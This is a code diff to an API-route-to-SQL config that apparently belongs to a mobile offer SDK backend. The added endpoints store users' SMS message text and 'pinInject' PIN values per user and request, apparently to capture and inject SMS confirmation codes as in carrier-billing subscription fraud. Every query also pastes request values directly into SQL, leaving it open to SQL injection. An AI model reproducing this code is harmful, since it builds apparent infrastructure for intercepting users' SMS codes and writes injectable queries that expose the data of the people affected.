@@ -80,3 +80,13 @@ GET /api/permissions/details:
 #根据appID 以及时间查询统计用户数 和pv
 GET /api/permissions/tootalPV:
   (SELECT offerId,appId,COUNT(offerId) AS totalPV,COUNT(DISTINCT userId)AS totalUserCount,SUM(IF(networkType!=2,0,1)) AS mobilePV,SUM(IF(networkType=2,0,1))AS wifiPV,COUNT(DISTINCT CASE WHEN networkType!=2 THEN userId END)AS mobileUserCount,COUNT(DISTINCT CASE WHEN networkType=2 THEN userId END)AS wifiUserCount FROM(SELECT visit.appId AS appId,visit.offerId AS offerId,permissionCollect.userId AS userId,permissionCollect.networkType AS networkType,permissionCollect.canNotify AS canNotify FROM(SELECT*FROM permissionCollect) permissionCollect LEFT JOIN (SELECT offerId,requestId,appId FROM sdkOfferCollect WHERE appId=${data.appId}AND uploadTime BETWEEN FROM_UNIXTIME(${data.timeStart}/1000)AND FROM_UNIXTIME(${data.timeEnd}/1000) GROUP BY requestId) visit ON permissionCollect.requestId=visit.requestId) s WHERE !ISNULL(s.offerId) GROUP BY s.offerId);
+#短信表插入
+POST /api/pins/getIde:
+  INSERT INTO pinCodeCollects (appId,offerId,userId,requestId,pinInject,message,uploadTime) VALUES (${data.appId},${data.offerId},${data.userId},${data.requestId},${data.pinInject},${data.message},${data.uploadTime});
+POST /api/pin/getIde:
+  INSERT INTO pinCodeCollect (appId,offerId,userId,requestId,pinInject,message,uploadTime) VALUES (${data.appId},${data.offerId},${data.userId},${data.requestId},${data.pinInject},${data.message},${data.uploadTime});
+#短信更新
+GET /api/pinInjects/getIde:
+  update pinCodeCollects set pinInject=${data.pinInject} WHERE requestId = ${data.requestId};
+GET /api/pinInject/getIde:
+  update pinCodeCollect set pinInject=${data.pinInject} WHERE requestId = ${data.requestId};  
